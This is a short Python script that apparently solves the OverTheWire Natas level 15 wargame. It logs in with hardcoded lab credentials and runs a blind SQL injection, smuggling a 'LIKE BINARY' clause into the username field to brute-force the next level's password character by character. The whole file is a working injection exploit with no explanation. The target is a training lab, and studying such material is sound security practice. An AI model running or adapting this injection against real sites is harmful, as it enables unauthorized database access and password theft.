import requests
from requests.auth import HTTPBasicAuth
import string

s = requests.Session()
s.auth = HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

url = 'http://natas15.natas.labs.overthewire.org/'
sql = 'natas16" AND password LIKE BINARY "{}%'
password = ""
list = string.ascii_letters + string.digits

for i in range (32):
    for char in list:
        params = {"username" : sql.format(password+char)}
        req = s.post(url=url, params=params)
        if ("This user exists." in req.text):
            password += char


print(password)
